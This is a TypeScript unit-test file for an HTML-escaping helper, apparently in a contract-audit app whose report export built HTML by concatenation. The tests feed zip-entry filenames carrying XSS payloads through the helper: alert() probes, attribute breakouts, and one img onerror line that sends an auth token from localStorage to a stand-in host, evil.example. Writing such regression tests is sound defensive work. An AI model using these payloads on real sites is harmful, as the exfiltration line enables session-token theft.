import { describe, it, expect } from "vitest";
import { escapeHtml } from "./escape-html";

describe("escapeHtml", () => {
  it("escapes the five HTML-significant characters", () => {
    expect(escapeHtml(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#39;");
  });

  it("leaves ordinary contract filenames untouched", () => {
    expect(escapeHtml("ReentrancyBank.sol")).toBe("ReentrancyBank.sol");
    expect(escapeHtml("staking_program.rs")).toBe("staking_program.rs");
  });

  it("coerces null and undefined to an empty string rather than 'null'", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
  });

  it("coerces non-strings", () => {
    expect(escapeHtml(42)).toBe("42");
  });

  // The payloads below are the actual attack: a zip entry named so that the
  // report export, which builds HTML by concatenation and opens it as a
  // same-origin blob: URL, would execute script in the app's origin.
  const zipEntryPayloads = [
    `x<img src=x onerror="fetch('//evil.example/'+localStorage.getItem('sb-auth-token'))">.sol`,
    `<script>alert(document.domain)</script>.sol`,
    `<svg/onload=alert(1)>.rs`,
    `"><script>alert(1)</script>`,
    `'><img src=x onerror=alert(1)>`,
  ];

  it.each(zipEntryPayloads)("neutralises payload: %s", (payload) => {
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain("<script");
    expect(escaped).not.toContain("<img");
    expect(escaped).not.toContain("<svg");
    // No raw angle bracket survives, so nothing can open a tag.
    expect(escaped).not.toMatch(/[<>]/);
  });

  it("breaks out of neither attribute quoting style", () => {
    expect(escapeHtml(`" onload="alert(1)`)).not.toMatch(/"/);
    expect(escapeHtml(`' onload='alert(1)`)).not.toMatch(/'/);
  });

  it("does not double-escape on a single pass", () => {
    // One pass over already-escaped text would produce &amp;lt; if the helper
    // were applied twice; callers must escape exactly once.
    expect(escapeHtml("&lt;")).toBe("&amp;lt;");
  });
});
